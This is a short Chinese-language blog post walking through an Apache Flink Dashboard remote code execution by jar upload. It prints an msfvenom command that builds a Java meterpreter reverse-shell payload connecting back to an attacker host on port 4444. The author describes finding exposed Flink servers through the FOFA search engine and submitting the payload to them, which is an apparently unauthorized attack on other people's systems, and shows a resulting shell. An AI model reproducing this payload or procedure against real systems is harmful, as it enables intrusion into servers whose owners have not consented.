---
layout:     post
title:    Apache Flink RCE 复现
subtitle:   Apache Flink RCE 复现
date:       2019-11-14
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 漏洞复现
---
# Apache Flink RCE 复现

## 简介
Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。攻击者可直接在Apache Flink Dashboard页面中上传任意jar包，从而达到远程代码执行的目的。  
## 复现  
先用msf生成jar包：  
```
msfvenom -p java/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f jar > nakumura.jar
```
随便上fofa上找几个测试下，挺多的。  
![191114_1](/img/191114_fofa.png)  
然后点开一个，点 submit new job。  
![191114_2](/img/191114_uploadjar.png)  
emmm，已经被人玩坏了，点下add new+，上传jar包,然后submit一下就可以执行。  
![191114_3](/img/191114_submit.png)  
执行前记得先开启msf的监听。  
submit一下,返回。  
![191114_4](/img/191114_meterpreter.png)  

## 修复方式  
等官网出补丁或者新版本后及时更新
